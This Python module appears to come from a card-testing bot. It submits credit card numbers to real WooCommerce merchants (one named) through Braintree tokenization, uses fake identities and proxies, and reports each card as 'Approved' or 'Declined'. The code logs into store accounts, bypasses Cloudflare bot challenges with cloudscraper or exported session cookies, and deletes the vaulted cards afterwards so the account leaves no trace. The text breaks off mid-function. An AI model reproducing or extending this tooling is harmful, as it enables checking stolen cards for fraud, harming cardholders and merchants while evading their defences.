"""
Braintree Auth handler — credit card tokenization via Braintree GraphQL API.
Supports v1_with_cookies (simple tokenize), v3_with_cookies (with client
config) and v6_with_login (fully autonomous WooCommerce login flow, e.g.
scrubdaddy.com — no static accessToken needed).
"""

import base64
import json
import logging
import re
import threading
import time
from datetime import datetime, timedelta
from typing import Any, Dict, Optional, Tuple
from urllib.parse import urlparse

import requests

from core.session import REQUEST_TIMEOUT, _build_api_session, _apply_cookies
from core.geo import _fake
from core.proxy import _proxy_dict, is_proxy_error, categorize_proxy_error

logger = logging.getLogger(__name__)

APPROVED = "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅"
DECLINED = "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌"
ERROR = "𝙀𝙍𝙍𝙊𝙍 ⚠️"
SUCCESS = "𝙎𝙐𝘾𝘾𝞢𝙎𝙎 ✅"
FAILED = "𝙁𝘼𝙄𝙇𝙀𝘿 ❌"

_BT_TOKENIZE_QUERY = (
    "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) "    "{   tokenizeCreditCard(input: $input) {     token     creditCard "
    "{       bin       brandCode       last4       cardholderName "
    "      expirationMonth      expirationYear      binData "
    "{         prepaid         healthcare         debit         durbinRegulated "
    "        commercial         payroll         issuingBank         countryOfIssuance "
    "        productId       }     }   } }"
)

_BT_CONFIG_QUERY = (
    "query ClientConfiguration { clientConfiguration { analyticsUrl environment "
    "merchantId assetsUrl clientApiUrl creditCard { supportedCardBrands challenges "
    "threeDSecureEnabled threeDSecure { cardinalAuthenticationJWT } } applePayWeb "
    "{ countryCode currencyCode merchantIdentifier supportedCardBrands } paypal "
    "{ displayName clientId assetsUrl environment environmentNoNetwork unvettedMerchant "
    "braintreeClientId billingAgreementsEnabled merchantAccountId currencyCode payeeEmail } "
    "supportedFeatures } }"
)


def _short_req_error(exc: Exception) -> str:
    """User-safe one-liner for transport failures (no links, no blobs)."""
    s = str(exc)
    if "CERTIFICATE_VERIFY_FAILED" in s:
        return "Server TLS trust failed (update CA certificates on the server)"
    if "Max retries exceeded" in s or "NewConnectionError" in s:
        return "Connection failed, please try again later"
    return f"Request failed: {exc}"


def get_braintree_token(
    payload: Dict,
    card_info: Dict,
    random_person: Dict,
    access_token: str,
    gateway_config: Optional[Dict] = None,
) -> Tuple[Any, Any]:
    """Tokenize a credit card via Braintree GraphQL. Returns (token, brandCode)."""
    headers = {
        "Authorization": f"Bearer {access_token}",
        "braintree-version": "2018-05-10",
        "Content-Type": "application/json",
    }

    proxies = _proxy_dict(gateway_config) if gateway_config else None
    api_session = _build_api_session(proxies)

    try:
        resp = api_session.post(
            "https://payments.braintree-api.com/graphql",
            headers=headers,
            json=payload,
            timeout=REQUEST_TIMEOUT,
        )
        resp.raise_for_status()
        data = resp.json()
        token_data = data.get("data", {}).get("tokenizeCreditCard")
        if not token_data:
            logger.error("Unexpected Braintree tokenize response structure")
            return None, None
        return token_data["token"], token_data["creditCard"]["brandCode"]
    except requests.RequestException as exc:
        is_pe, _ = is_proxy_error(exc, bool((gateway_config or {}).get("proxy")))
        if is_pe:
            msg = categorize_proxy_error(exc)
            logger.error(f"Proxy error in get_braintree_token: {msg}")
            return f"PROXY_ERROR:{msg}", None
        logger.error(f"Braintree tokenize request failed: {exc}")
        return None, None
    except Exception as exc:
        logger.error(f"Unexpected error in get_braintree_token: {exc}")
        return None, None
    finally:
        api_session.close()


def get_braintree_client_config(
    access_token: str,
    gateway_config: Optional[Dict] = None,
) -> Any:
    """Fetch Braintree ClientConfiguration (used by v3 payload)."""
    headers = {
        "Authorization": f"Bearer {access_token}",
        "braintree-version": "2018-05-10",
        "Content-Type": "application/json",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36"
        ),
    }

    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": str(_fake.uuid4()),
        },
        "query": _BT_CONFIG_QUERY,
        "operationName": "ClientConfiguration",
    }

    proxies = _proxy_dict(gateway_config) if gateway_config else None
    api_session = _build_api_session(proxies)

    try:
        resp = api_session.post(
            "https://payments.braintree-api.com/graphql",
            json=payload,
            headers=headers,
            timeout=15,
        )
        resp.raise_for_status()
        data = resp.json()
        cfg = data.get("data", {}).get("clientConfiguration")
        if not cfg:
            raise ValueError("Invalid Braintree ClientConfiguration response")
        return cfg
    except requests.RequestException as exc:
        is_pe, _ = is_proxy_error(exc, bool((gateway_config or {}).get("proxy")))
        if is_pe:
            msg = categorize_proxy_error(exc)
            logger.error(f"Proxy error in get_braintree_client_config: {msg}")
            return f"PROXY_ERROR:{msg}"
        logger.error(f"Braintree client config request failed: {exc}")
        return None
    except Exception as exc:
        logger.error(f"Unexpected error in get_braintree_client_config: {exc}")
        return None
    finally:
        api_session.close()


def _build_bt_tokenize_payload(card_info: Dict, random_person: Dict = None, include_billing: bool = False) -> Dict:
    """Build the Braintree TokenizeCreditCard mutation payload."""
    credit_card: Dict[str, Any] = {
        "number": card_info["number"],
        "expirationMonth": card_info["month"],
        "expirationYear": card_info["year"],
        "cvv": card_info["cvv"],
    }
    if include_billing and random_person:
        credit_card["billingAddress"] = {
            "postalCode": random_person["zipcode"],
            "streetAddress": "",
        }
    return {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": str(_fake.uuid4()),
        },
        "query": _BT_TOKENIZE_QUERY,
        "variables": {
            "input": {
                "creditCard": credit_card,
                "options": {"validate": False},
            }
        },
        "operationName": "TokenizeCreditCard",
    }


def _check_required_fields(gateway_config: Dict, fields: list) -> Optional[str]:
    """Return missing field name or None if all present."""
    for f in fields:
        if f not in gateway_config:
            return f
    return None


def _proxy_error_result(token_or_config) -> Optional[Tuple]:
    """If *token_or_config* is a PROXY_ERROR string, return error tuple."""
    if isinstance(token_or_config, str) and token_or_config.startswith("PROXY_ERROR:"):
        return False, token_or_config.replace("PROXY_ERROR:", ""), None
    return None


def handle_braintree_auth(card_info: Dict, person: Dict, gateway_config: Dict) -> Tuple[str, str]:
    """Main entry point for Braintree Auth processing.

    Supports:
        - v1_with_cookies: Tokenize card + submit via WooCommerce form
        - v3_with_cookies: Tokenize card with billing + submit with client config
    """
    version = gateway_config.get("version", "")

    from gateways.stripe_auth import extract_payment_config, _build_dummy_session

    # v5: direct merchant POST (portal.tdisdi.com) — Braintree-backed vault,
    # login-only via map `login` block (SAML auto-login).
    # Version name carries "with_login" so gateway_manager attaches credentials.
    if "v5_with_login" in version:
        from gateways.tdisdi import handle_tdisdi_auth
        return handle_tdisdi_auth(card_info, person, gateway_config)

    # v6: fully autonomous WooCommerce + Braintree vault via account login
    # (scrubdaddy.com). Only `login` in GitHub map; accessToken / nonces are
    # scraped fresh every run and never stored.
    if "v6_with_login" in version:
        return _braintree_v6_login_flow(card_info, person, gateway_config)

    session = _build_dummy_session(gateway_config, person)

    try:
        secrets = extract_payment_config(None, card_info["number"], person, gateway_config, session)

        if secrets.get("proxy_error"):
            return ERROR, secrets["proxy_error"]

        if "v1_with_cookies" in version:
            missing = _check_required_fields(
                gateway_config, ["cookies", "url", "access_token", "success_message", "error_message", "post_url"]
            )
            if missing:
                return ERROR, f"{missing} is missing in gateway config"

            nonce = secrets.get("nonce")
            if not nonce:
                return ERROR, "Failed to fetch nonce"

            bt_payload = _build_bt_tokenize_payload(card_info, include_billing=False)
            token, brand_code = get_braintree_token(
                bt_payload, card_info, person, gateway_config["access_token"], gateway_config
            )
            err = _proxy_error_result(token)
            if err:
                return ERROR, err[1]
            if not token or not brand_code:
                return FAILED, "Failed to fetch token or brand code"

            payload = {
                "payment_method": "braintree_credit_card",
                "wc-braintree-credit-card-card-type": brand_code,
                "wc-braintree-credit-card-3d-secure-enabled": "",
                "wc-braintree-credit-card-3d-secure-verified": "",
                "wc-braintree-credit-card-3d-secure-order-total": "0.00",
                "wc_braintree_credit_card_payment_nonce": token,
                "wc_braintree_device_data": json.dumps({"correlation_id": str(_fake.uuid4())}),
                "wc-braintree-credit-card-tokenize-payment-method": "true",
                "woocommerce-add-payment-method-nonce": nonce,
                "_wp_http_referer": "/my-account/add-payment-method",
                "woocommerce_add_payment_method": "1",
            }

            _apply_cookies(session, gateway_config)

            resp = session.post(
                url=gateway_config["post_url"],
                data=payload,
                allow_redirects=True,
                timeout=REQUEST_TIMEOUT,
            )
            session.cookies.update(resp.cookies)

            status, message = _parse_bt_response(
                resp.content, gateway_config, person, card_info, session
            )
            return status, message

        if "v3_with_cookies" in version:
            missing = _check_required_fields(
                gateway_config, ["cookies", "url", "success_message", "error_message"]
            )
            if missing:
                return ERROR, f"{missing} is missing in gateway config"

            hours_left = _bt_cookie_expiry_hours(gateway_config.get("cookies"))
            if hours_left is not None and hours_left < 48:
                logger.warning(
                    f"Braintree v3 cookies expire in ~{hours_left:.1f}h — refresh them from the browser soon"
                )

            # Fresh page-embedded token first (rotates ~daily, always current);
            # static map accessToken only as fallback.
            nonce = secrets.get("nonce")
            if not nonce:
                if secrets.get("http_status") == 403:
                    logger.warning("BT v3: vault page 403 (Cloudflare wall, not cookies)")
                    return ERROR, "Cloudflare blocked the check, please try again later"
                logger.warning("BT v3: vault page missing (cookies dead) — refresh map cookies")
                return ERROR, "Session expired, please try again later"
            access_token = secrets.get("client_token_fp") or gateway_config.get("access_token")
            if not access_token:
                return ERROR, "Failed to extract accessToken (page token + map token missing)"

            bt_payload = _build_bt_tokenize_payload(card_info, person, include_billing=True)
            token, brand_code = get_braintree_token(
                bt_payload, card_info, person, access_token, gateway_config
            )
            err = _proxy_error_result(token)
            if err:
                return ERROR, err[1]
            if not token or not brand_code:
                return FAILED, "Failed to fetch token or brand code"

            client_cfg = get_braintree_client_config(access_token, gateway_config)
            err = _proxy_error_result(client_cfg)
            if err:
                return ERROR, err[1]
            if not client_cfg:
                return FAILED, "Failed to get Braintree client configuration"

            config_data = {
                "environment": client_cfg["environment"],
                "clientApiUrl": client_cfg["clientApiUrl"],
                "assetsUrl": client_cfg["assetsUrl"],
                "merchantId": client_cfg["merchantId"],
                "analytics": {"url": client_cfg["analyticsUrl"]},
                "creditCards": {"supportedCardTypes": client_cfg["creditCard"]["supportedCardBrands"]},
                "challenges": client_cfg["creditCard"]["challenges"],
                "threeDSecureEnabled": client_cfg["creditCard"]["threeDSecureEnabled"],
                "paypal": client_cfg["paypal"],
                "applePayWeb": client_cfg["applePayWeb"],
            }

            payload = {
                "payment_method": "braintree_cc",
                "braintree_cc_nonce_key": token,
                "braintree_cc_device_data": json.dumps({
                    "device_session_id": str(_fake.uuid4()),
                    "correlation_id": str(_fake.uuid4()),
                }),
                "braintree_cc_config_data": json.dumps(config_data),
                "woocommerce-add-payment-method-nonce": nonce,
                "_wp_http_referer": "/my-account/add-payment-method/",
                "woocommerce_add_payment_method": "1",
            }

            _apply_cookies(session, gateway_config)

            resp = session.post(
                url=gateway_config["url"],
                data=payload,
                allow_redirects=True,
                timeout=REQUEST_TIMEOUT,
            )
            session.cookies.update(resp.cookies)

            status, message = _parse_bt_response(
                resp.content, gateway_config, person, card_info, session
            )
            if status == APPROVED:
                # Keep the account clean: delete the card just added.
                _bt_wc_cleanup(session, gateway_config)
            return status, message

        return ERROR, f"Unsupported Braintree version: {version}"

    except requests.RequestException as exc:
        is_pe, _ = is_proxy_error(exc, bool((gateway_config or {}).get("proxy")))
        if is_pe:
            return ERROR, categorize_proxy_error(exc)
        return ERROR, _short_req_error(exc)
    except Exception as exc:
        logger.error(f"Unexpected error in handle_braintree_auth: {exc}")
        return ERROR, f"Processing failed: {exc}"
    finally:
        try:
            session.close()
        except Exception:
            pass


def _bt_cookie_expiry_hours(cookies) -> Optional[float]:
    """Remaining lifetime of a WordPress logged-in cookie, if decodable.

    Value format: username|expiration|token|hmac (URL-encoded in the map).
    Only readable — expiry can never be forged/extended client-side.
    """
    try:
        from urllib.parse import unquote as _unquote
        items = cookies if isinstance(cookies, list) else []
        for c in items:
            if not isinstance(c, dict):
                continue
            if (c.get("name") or "").startswith("wordpress_logged_in_"):
                parts = _unquote(c.get("value") or "").split("|")
                if len(parts) >= 2 and parts[1].isdigit():
                    import time as _t
                    return (int(parts[1]) - _t.time()) / 3600.0
        return None
    except Exception:
        return None


def _bt_wc_cleanup(session: requests.Session, gateway_config: Dict) -> None:
    """Best-effort delete of saved cards on the WooCommerce payment-methods page.

    Keeps the vault account clean after an approved check. Never raises.
    """
    try:
        from urllib.parse import urlparse as _urlparse
        parsed = _urlparse(gateway_config.get("url", ""))
        origin = f"{parsed.scheme}://{parsed.netloc}"
        if not parsed.netloc:
            return
        resp = session.get(f"{origin}/my-account/payment-methods/", timeout=REQUEST_TIMEOUT)
        for mid, nonce in _RE_V6_DELETE_LINK.findall(resp.text or ""):
            try:
                session.get(
                    f"{origin}/my-account/delete-payment-method/{mid}/?_wpnonce={nonce}",
                    timeout=REQUEST_TIMEOUT,
                )
            except requests.RequestException:
                pass
    except Exception as exc:
        logger.debug(f"BT WC cleanup skipped: {exc}")


def _full_li_text(node) -> str:
    """Full text of the nearest <li> (or the node itself).

    Error <li> items often wrap the message in nested tags (<strong>,
    <span>, <br>); reading only the first text node truncates it
    (e.g. a lone "CVV."). string(.) concatenates everything.
    """
    try:
        parent = node.getparent() if hasattr(node, "getparent") else None
        target = node
        if parent is not None:
            found = parent.xpath("ancestor-or-self::li[1]")
            target = found[0] if found else parent
        txt = target.xpath("string(.)") if hasattr(target, "xpath") else str(node)
        return re.sub(r"\s+", " ", txt).strip()
    except Exception:
        try:
            return str(node).strip()
        except Exception:
            return ""


def _parse_bt_response(
    content: bytes,
    gateway_config: Dict,
    random_person: Dict,
    card_info: Dict,
    session: requests.Session,
) -> Tuple[str, str]:
    """Parse Braintree HTML response and return (status, message)."""
    import re as _re
    from urllib.parse import urlparse
    from lxml import html as lxml_html

    _RE_ERROR_MSG = _re.compile(r":\s*(.*?)(?=\s*\(|$)")

    try:
        data = json.loads(content)
        if isinstance(data, dict) and "message" in data \
                and not any(k in data for k in ("success", "error", "status")):
            # Edge-cache/WAF rejection shaped like {"message": "..."} — this
            # is NOT a card verdict (e.g. POST refused from flagged IPs).
            logger.warning(f"BT edge block: {str(data.get('message', ''))[:200]}")
            return ERROR, "Gateway edge blocked the check, please try again later"
        if "proxy_error" in data:
            return ERROR, data["proxy_error"]
        if data.get("status") == "succeeded":
            return SUCCESS, "Succeeded"
        if data.get("success") is True:
            return SUCCESS, "Approved"
        error_message = "Unknown error"
        if "error" in data:
            error_message = data["error"].get("message", "Unknown error")
        return FAILED, error_message
    except (json.JSONDecodeError, ValueError):
        pass

    tree = lxml_html.fromstring(content)
    parsed = urlparse(gateway_config["url"])
    origin = f"{parsed.scheme}://{parsed.netloc}"

    try:
        text = content.decode("utf-8", errors="replace") \
            if isinstance(content, (bytes, bytearray)) else str(content or "")
    except Exception:
        text = ""
    low = text.lower()

    # ── diagnostics: name the real cause instead of a blank error ──
    # (user-facing texts stay link-free; details go to server logs only)
    if ('name="woocommerce-login-nonce"' in text
            and 'name="woocommerce-add-payment-method-nonce"' not in text):
        logger.warning("BT auth: login page served (cookies dead) — refresh map cookies")
        return ERROR, "Session expired, please try again later"
    title = ""
    _tm = _re.search(r"<title>(.*?)</title>", text, _re.S | _re.I)
    if _tm:
        title = _re.sub(r"\s+", " ", _tm.group(1)).strip()[:80]
    if ("just a moment" in title.lower() or "attention required" in title.lower()
            or "security verification" in title.lower()
            or 'action="/cdn-cgi/challenge-platform' in low
            or "action='/cdn-cgi/challenge-platform" in low):
        return ERROR, "Cloudflare blocked the check, retry (proxy?)"

    success_xpath = gateway_config.get("success_message", "")
    if success_xpath:
        success_nodes = tree.xpath(success_xpath)
        if success_nodes:
            message = "Approved"
            return APPROVED, message

    error_xpath = gateway_config.get("error_message", "")
    if error_xpath:
        error_nodes = tree.xpath(error_xpath)
        if error_nodes:
            raw_msg = _full_li_text(error_nodes[0])
            m = _RE_ERROR_MSG.search(raw_msg)
            extracted = (m.group(1).strip() if m else raw_msg).strip()
            if not extracted:
                extracted = raw_msg

            if "Duplicate card exists in the vault" in extracted:
                extracted = "Approved old try again"
                return APPROVED, extracted

            return DECLINED, extracted

    # ── generic sweep: site notices in ANY tag (div/ul/span), any nesting ──
    for cls, status, ok_word in (
        ("woocommerce-message", APPROVED, "Approved"),
        ("woocommerce-error", DECLINED, ""),
        ("woocommerce-info", DECLINED, ""),
        ("wc-braintree-notice", DECLINED, ""),
        ("wc-braintree-error", DECLINED, ""),
    ):
        try:
            nodes = tree.xpath(
                f"//*[contains(concat(' ', normalize-space(@class), ' '), ' {cls} ')]"
                "//text()[normalize-space()]"
            )
        except Exception:
            continue
        msg = " ".join(_re.sub(r"\s+", " ", t).strip() for t in nodes).strip()[:300]
        if not msg:
            continue
        if status == APPROVED:
            return APPROVED, ok_word
        m = _RE_ERROR_MSG.search(msg)
        extracted = (m.group(1).strip() if m else msg)[:300]
        if "Duplicate card exists in the vault" in extracted:
            return APPROVED, "Approved old try again"
        return DECLINED, extracted or msg

    hint = f" (page: {title})" if title else ""
    return ERROR, f"No success or error message found in response{hint}"


# ═══════════════════════════════════════════════════════════════════════════
#  v6_with_login — fully autonomous WooCommerce Braintree vault (scrubdaddy)
#
#  GitHub map needs ONLY:  url + login{set_N: {email, password}} + gate_urls.
#  Everything else (login nonce, add-payment-method nonce, client token /
#  accessToken, merchant config) is scraped fresh on every run:
#
#    1. GET add-payment-method -> login if needed (woocommerce-login-nonce)
#    2. Scrape woocommerce-add-payment-method-nonce + wc_braintree_client_token
#       (base64 JSON -> authorizationFingerprint = GraphQL Bearer token)
#    3. Tokenize card at payments.braintree-api.com/graphql (validate:false,
#       so tokenize succeeds even for declined cards — verdict comes later)
#    4. POST vault form (payment_method=braintree_cc + nonce token)
#         - 302 -> payment-methods + "successfully added"  -> APPROVED
#         - 200 + woocommerce-error "Reason: X"             -> DECLINED "X"
#    5. Best-effort delete of the added card (keeps account clean).
#
#  Optional fast-path: `cookies: {set_N: [{name, value, domain}]}` holding a
#  manually-exported logged-in session. When present and valid it is used
#  directly (no login POST). Useful because Cloudflare puts a "Security
#  Verification" managed challenge on automated login POSTs while normal
#  page/form POSTs pass — a real-browser session sidesteps that wall.
#  (Export `wordpress_logged_in_*` — plus `cf_clearance`/`__cf_bm` when the
#  server runs on the same IP — from devtools after logging in manually.)
# ═══════════════════════════════════════════════════════════════════════════

_RE_V6_LOGIN_NONCE = re.compile(r'name="woocommerce-login-nonce" value="([^"]+)"')
_RE_V6_ADDPM_NONCE = re.compile(
    r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"'
)
_RE_V6_CLIENT_TOKEN = re.compile(r'wc_braintree_client_token\s*=\s*\["([^"]+)"\]')
_RE_V6_DELETE_LINK = re.compile(r'delete-payment-method/(\d+)/\?_wpnonce=([a-f0-9]+)')
_RE_V6_ERROR_LI = re.compile(
    r'<ul class="woocommerce-error[^"]*"[^>]*>(.*?)</ul>', re.S | re.I
)
_RE_V6_REASON = re.compile(r"Reason:\s*(.+)", re.I | re.S)
_RE_V6_TITLE = re.compile(r"<title>(.*?)</title>", re.S | re.I)

_V6_LOGIN_CACHE_TTL = timedelta(hours=5)
_v6_login_cache: Dict[str, Dict[str, Any]] = {}
_v6_login_cache_lock = threading.Lock()
_v6_login_lock = threading.Lock()


def _v6_cached_cookies(login_email: str) -> Optional[Dict[str, str]]:
    with _v6_login_cache_lock:
        entry = _v6_login_cache.get(login_email)
        if not entry:
            return None
        if datetime.now() - entry["ts"] > _V6_LOGIN_CACHE_TTL:
            _v6_login_cache.pop(login_email, None)
            logger.info(f"Braintree v6 login cache expired for {login_email}")
            return None
        logger.info(f"Braintree v6 login cache hit for {login_email}")
        return entry["cookies"]


def _v6_store_cookies(login_email: str, cookies: Dict[str, str]) -> None:
    with _v6_login_cache_lock:
        _v6_login_cache[login_email] = {"cookies": cookies, "ts": datetime.now()}
    logger.info(f"Braintree v6 login session cached for {login_email}")


def _v6_drop_cookies(login_email: str) -> None:
    with _v6_login_cache_lock:
        _v6_login_cache.pop(login_email, None)


try:
    from cloudscraper.exceptions import (
        CloudflareChallengeError,
        CloudflareCaptchaError,
    )
    _CS_ERRORS = (CloudflareChallengeError, CloudflareCaptchaError)
except ImportError:  # cloudscraper optional at runtime
    _CS_ERRORS = ()


def _v6_cs_msg(exc: Exception) -> Optional[str]:
    """Clean message when cloudscraper hits an unsolved challenge/captcha."""
    if _CS_ERRORS and isinstance(exc, _CS_ERRORS):
        return "Cloudflare blocked the check, please try again later"
    if type(exc).__name__.startswith("Cloudflare"):
        return "Cloudflare blocked the check, please try again later"
    return None


def _v6_build_session(gateway_config: Dict, person: Dict) -> requests.Session:
    """Session honoring the bot's BYPASS_CLOUDSCRAPER toggle.

    ON  -> cloudscraper (browser TLS + transparent JS-challenge solving;
           proven live to pass this site's login + vault pages).
    OFF -> plain requests (likely Cloudflare-walled here).
    """
    proxies = _proxy_dict(gateway_config)
    if gateway_config.get("bypass_cloudscraper"):
        try:
            import cloudscraper as _cs
            s = _cs.create_scraper(
                browser={"browser": "chrome", "platform": "windows",
                         "mobile": False})
            if proxies:
                s.proxies.update(proxies)
            return s
        except Exception as exc:
            logger.warning(f"Braintree v6 cloudscraper unavailable ({exc}), plain session")
    return _build_api_session(proxies)


def _v6_is_logged_in(html_text: str) -> bool:
    if not html_text:
        return False
    if _RE_V6_ADDPM_NONCE.search(html_text):
        return True
    low = html_text.lower()
    return "customer-logout" in low and "woocommerce-login-nonce" not in html_text


def _v6_page_title(html_text: str) -> str:
    m = _RE_V6_TITLE.search(html_text or "")
    if not m:
        return ""
    return re.sub(r"\s+", " ", m.group(1)).strip()[:120]


def _v6_is_challenge(html_text: str, status: int) -> bool:
    """Detect Cloudflare/bot-wall interstitials on ANY status.

    Note: normal scrubdaddy pages embed `challenge-platform` precursor JS in
    the footer, so footer scripts alone must NOT count — only challenge page
    titles / challenge forms do.
    """
    low = (html_text or "").lower()
    title = _v6_page_title(html_text).lower()
    if "just a moment" in title or "attention required" in title:
        return True
    if "verify you are human" in title or "verifying you are human" in low:
        return True
    # Interstitial challenge forms post to /cdn-cgi/challenge-platform/h/…
    # (embedded Turnstile widgets like cf-chl-widget-* do NOT count).
    if ("challenge-form" in low or 'action="/cdn-cgi/challenge-platform' in low
            or "action='/cdn-cgi/challenge-platform" in low):
        return True
    if status in (403, 503) and (
        "just a moment" in low or "cf-chl" in low or "cloudflare" in low
    ):
        return True
    return False


def _v6_decode_client_token(token_b64: str) -> Optional[Dict[str, Any]]:
    try:
        padded = token_b64 + "=" * (-len(token_b64) % 4)
        return json.loads(base64.b64decode(padded).decode("utf-8"))
    except Exception as exc:
        logger.error(f"Braintree v6 client token decode failed: {exc}")
        return None


def _v6_build_config_data(client: Dict[str, Any]) -> Dict[str, Any]:
    """Rebuild the braintree_cc_config_data JSON the browser sends.

    Field mapping verified against live HAR (2026-09-27, scrubdaddy.com).
    """
    apple = client.get("applePay") or {}
    paypal = client.get("paypal") or {}
    analytics = client.get("analytics") or {}
    graph = client.get("graphQL") or {}
    return {
        "environment": client.get("environment", "production"),
        "clientApiUrl": client.get("clientApiUrl", ""),
        "assetsUrl": client.get("assetsUrl", ""),
        "analytics": {"url": analytics.get("url", "")},
        "merchantId": client.get("merchantId", ""),
        "venmo": "off",
        "graphQL": {
            "url": graph.get("url", "https://payments.braintree-api.com/graphql"),
            "features": ["tokenize_credit_cards"],
        },
        "applePayWeb": {
            "countryCode": apple.get("countryCode", "US"),
            "currencyCode": apple.get("currencyCode", "USD"),
            "merchantIdentifier": apple.get("merchantIdentifier", ""),
            "supportedNetworks": [n.lower() for n in apple.get("supportedNetworks", [])]
            or ["visa", "mastercard", "amex", "discover"],
        },
        "challenges": client.get("challenges", ["cvv", "postal_code"]),
        "creditCards": {
            "supportedCardTypes": client.get("supportedCardTypes")
            or ["Visa", "MasterCard", "Discover", "JCB", "American Express", "UnionPay"]
        },
        "threeDSecureEnabled": client.get("threeDSecureEnabled", False),
        "threeDSecure": None,
        "paypalEnabled": client.get("paypalEnabled", True),
        "paypal": {
            "displayName": paypal.get("displayName", ""),
            "clientId": paypal.get("clientId", ""),
            "assetsUrl": paypal.get("baseUrl", paypal.get("assetsUrl", "https://checkout.paypal.com")),
            "environment": paypal.get("environment", "live"),
            "environmentNoNetwork": paypal.get("environmentNoNetwork", False),
            "unvettedMerchant": paypal.get("unvettedMerchant", False),
            "braintreeClientId": paypal.get("braintreeClientId", ""),
            "billingAgreementsEnabled": paypal.get("billingAgreementsEnabled", True),
            "merchantAccountId": paypal.get("merchantAccountId", client.get("merchantAccountId", "")),
            "payeeEmail": paypal.get("payeeEmail"),
            "currencyIsoCode": paypal.get("currencyIsoCode", paypal.get("currencyCode", "USD")),
        },
    }


def _v6_login(
    session: requests.Session, url: str, email: str, password: str
) -> Tuple[bool, str]:
    """WooCommerce form login. Returns (ok, error)."""
    using_proxy = bool(getattr(session, "proxies", None))
    try:
        resp = session.get(url, timeout=REQUEST_TIMEOUT, allow_redirects=True)
    except requests.RequestException as exc:
        cs_msg = _v6_cs_msg(exc)
        if cs_msg:
            return False, cs_msg
        is_pe, _ = is_proxy_error(exc, using_proxy)
        return False, categorize_proxy_error(exc) if is_pe else _short_req_error(exc)
    if _v6_is_challenge(resp.text, resp.status_code):
        return False, "Cloudflare blocked the login page, retry with proxy"
    if _v6_is_logged_in(resp.text or ""):
        return True, ""
    m = _RE_V6_LOGIN_NONCE.search(resp.text or "")
    if not m:
        return False, "login form not found (site changed?)"
    try:
        login_resp = session.post(
            url,
            data={
                "username": email,
                "password": password,
                "rememberme": "forever",
                "woocommerce-login-nonce": m.group(1),
                "_wp_http_referer": "/my-account/add-payment-method/",
                "login": "Log in",
            },
            allow_redirects=True,
            timeout=REQUEST_TIMEOUT,
        )
    except requests.RequestException as exc:
        cs_msg = _v6_cs_msg(exc)
        if cs_msg:
            return False, cs_msg
        is_pe, _ = is_proxy_error(exc, using_proxy)
        return False, categorize_proxy_error(exc) if is_pe else _short_req_error(exc)
    page = login_resp.text or ""
    if _v6_is_logged_in(page):
        return True, ""
    edge = _v6_edge_block(page)
    if edge:
        return False, edge
    if _v6_is_challenge(page, login_resp.status_code):
        return False, "login blocked by Cloudflare challenge, retry with proxy"
    # WooCommerce re-renders its own failure notice (wrong password, unknown
    # email, locked account, expired session...). Surface its exact text so
    # the cause is visible instead of a generic "unknown reason".
    m_err = _RE_V6_ERROR_LI.search(page)
    if m_err:
        clean = re.sub(r"<[^>]+>", " ", m_err.group(1))
        clean = re.sub(r"\s+", " ", clean).strip()[:200]
        return False, f"login failed ({clean or 'wrong email/password?'})"
    if "woocommerce-login-nonce" in page:
        return False, "login failed (wrong email/password?)"
    title = _v6_page_title(page)
    final = (login_resp.url or "")[:120]
    return False, f"login failed (unexpected page: {title or 'no title'} @ {final})"


def _v6_cleanup(session: requests.Session, origin: str) -> None:
    """Best-effort delete of saved cards. Never raises."""
    try:
        resp = session.get(
            f"{origin}/my-account/payment-methods/", timeout=REQUEST_TIMEOUT
        )
        links = _RE_V6_DELETE_LINK.findall(resp.text or "")
        for _mid, _nonce in links:
            try:
                session.get(
                    f"{origin}/my-account/delete-payment-method/{_mid}/?_wpnonce={_nonce}",
                    timeout=REQUEST_TIMEOUT,
                )
            except requests.RequestException:
                pass
    except Exception as exc:
        logger.debug(f"Braintree v6 cleanup skipped: {exc}")


def _v6_edge_block(html_text: str) -> Optional[str]:
    """Detect edge-cache/WAF JSON rejections (NOT a card verdict)."""
    try:
        data = json.loads(html_text or "")
    except (ValueError, TypeError):
        return None
    if isinstance(data, dict) and "message" in data \
            and not any(k in data for k in ("success", "error", "status")):
        logger.warning(f"BT v6 edge block: {str(data.get('message', ''))[:200]}")
        return "Gateway edge blocked the check, please try again later"
    return None


def _v6_extract_error(html_text: str) -> str:
    m = _RE_V6_ERROR_LI.search(html_text or "")
    if not m:
        return "Card declined"
    clean = re.sub(r"<[^>]+>", " ", m.group(1))
    clean = re.sub(r"\s+", " ", clean).strip()
    rm = _RE_V6_REASON.search(clean)
    if rm:
        return rm.group(1).strip()[:300]
    if "Duplicate card exists in the vault" in clean:
        return "DUPLICATE"
    return clean[:300] if clean else "Card declined"


def _braintree_v6_login_flow(
    card_info: Dict, person: Dict, gateway_config: Dict
) -> Tuple[str, str]:
    """Fully autonomous WooCommerce Braintree vault check (login-only)."""
    url = gateway_config.get("url", "")
    if not url:
        return ERROR, "url is missing in gateway config"
    login = gateway_config.get("login") or {}
    email = login.get("email", "")
    password = login.get("password", "")
    if not email or not password:
        return ERROR, "Login credentials missing in gateway config"

    parsed = urlparse(url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    # Bot setting BYPASS_CLOUDSCRAPER decides the engine: cloudscraper
    # (proven live to pass this site's login + vault) or plain requests.
    session = _v6_build_session(gateway_config, person)
    using_proxy = bool(getattr(session, "proxies", None))
    session.headers.update(
        {
            "User-Agent": person.get("user_agent", (
                "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36"
            )),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Upgrade-Insecure-Requests": "1",
        }
    )

    try:
        # Static map cookies first (manual real-browser session fast-path),
        # then previously auto-logged-in cookies on top.
        _apply_cookies(session, gateway_config)
        cached = _v6_cached_cookies(email)
        if cached:
            for _n, _v in cached.items():
                session.cookies.set(_n, _v)

        # 1) Load page (login when needed, serialized per account).
        with _v6_login_lock:
            try:
